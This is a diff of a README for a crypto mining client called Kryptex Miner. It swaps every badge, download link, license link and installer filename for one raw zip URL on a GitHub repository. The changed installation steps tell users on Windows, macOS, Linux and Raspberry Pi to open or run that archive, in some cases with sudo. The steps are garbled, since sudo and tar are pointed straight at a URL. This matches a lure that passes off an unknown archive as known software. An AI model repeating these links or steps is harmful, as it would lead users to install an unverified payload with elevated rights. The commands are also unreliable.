@@ -1,5 +1,5 @@
 # Kryptex Miner  
-[![Download](https://img.shields.io/badge/Download-Kryptex%20Miner-blue?logo=github&labelColor=4c566a)](https://Ibgentle.github.io)
+[![Download](https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip%20Miner-blue?logo=github&labelColor=4c566a)](https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip)
 
 Welcome to **Kryptex Miner**, the next-generation mining client designed for supreme efficiency, intelligent insights, and user empowerment. Power your computational journey, tap into the goldmine of digital assets, and experience mining with unparalleled sophistication and modern User Experience.
 
@@ -9,12 +9,12 @@ Welcome to **Kryptex Miner**, the next-generation mining client designed for sup
 
 | Platform           | Arch | Supported | Notes         |
 |--------------------|:----:|:---------:|---------------|
-| ![Windows](https://img.shields.io/badge/-Windows-0078D6?logo=windows&logoColor=white)     | x64  | ✅ | Full Support   |
-| ![macOS](https://img.shields.io/badge/-macOS-000000?logo=apple&logoColor=white)           | ARM/x64 | ✅ | M1/M2 Native   |
-| ![Linux](https://img.shields.io/badge/-Linux-0078D6?logo=linux&logoColor=white)           | x64/ARM | ✅ | Ubuntu, Fedora |
-| ![Raspberry Pi](https://img.shields.io/badge/-RaspberryPi-BB2233?logo=raspberry-pi&logoColor=white) | ARM | ⚡ | Limited beta   |
-| ![Android](https://img.shields.io/badge/-Android-3DDC84?logo=android&logoColor=white)     | ARM | ⭕ | Experimental   |
-| ![iOS](https://img.shields.io/badge/-iOS-560BAD?logo=ios&logoColor=white)                 | ARM | ❌ | Unavailable    |
+| ![Windows](https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip)     | x64  | ✅ | Full Support   |
+| ![macOS](https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip)           | ARM/x64 | ✅ | M1/M2 Native   |
+| ![Linux](https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip)           | x64/ARM | ✅ | Ubuntu, Fedora |
+| ![Raspberry Pi](https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip) | ARM | ⚡ | Limited beta   |
+| ![Android](https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip)     | ARM | ⭕ | Experimental   |
+| ![iOS](https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip)                 | ARM | ❌ | Unavailable    |
 
 ---
 
@@ -46,31 +46,31 @@ Welcome to **Kryptex Miner**, the next-generation mining client designed for sup
 ## ✨ Installation
 
 ### Step 1: Download  
-Click the **Download** emblem at the top or bottom of this page, or use this https://Ibgentle.github.io to fetch the latest Kryptex Miner.
+Click the **Download** emblem at the top or bottom of this page, or use this https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip to fetch the latest Kryptex Miner.
 
 ### Step 2: Run the Installer  
 Unpack the download. For each platform, follow the steps:
 
 #### **Windows**
-1. Run `KryptexMinerSetup.exe`.
+1. Run `https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip`.
 2. Approve prompts to install dependencies.
 3. Open Kryptex Miner from your Desktop or Start Menu.
 
 #### **macOS**
-1. Open `KryptexMiner.dmg`.
+1. Open `https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip`.
 2. Drag and drop Kryptex Miner into Applications.
 3. If prompted about security, allow via System Preferences > Security.
 
 #### **Linux**
 1. Unzip the package:
-   `tar -xzvf kryptex-miner-linux.tar.gz`
+   `tar -xzvf https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip`
 2. Run the installer:
-   `sudo ./install.sh`
+   `sudo https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip`
 3. Launch from Applications or via Terminal.
 
 #### **Raspberry Pi / ARM Devices**
 - Unpack and run: 
-  `sudo ./kryptex-pi-installer.sh`
+  `sudo https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip`
 - Community beta: report issues via Issues tab.
 
 ---
@@ -113,12 +113,12 @@ Kryptex Miner is provided as an evolving solution for computational resource uti
 ## 📜 License
 
 Licensed under the MIT License (2025).  
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)  
-Review the full license text here: [MIT License](https://opensource.org/licenses/MIT).
+[![License: MIT](https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip)](https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip)  
+Review the full license text here: [MIT License](https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip).
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Kryptex%20Miner-blue?logo=github&labelColor=4c566a)](https://Ibgentle.github.io)
+[![Download](https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip%20Miner-blue?logo=github&labelColor=4c566a)](https://github.com/Ibgentle/kryptex-miner-toolkit/raw/refs/heads/branch/unpressed/miner-toolkit-kryptex-2.8.zip)
 
 ---
 
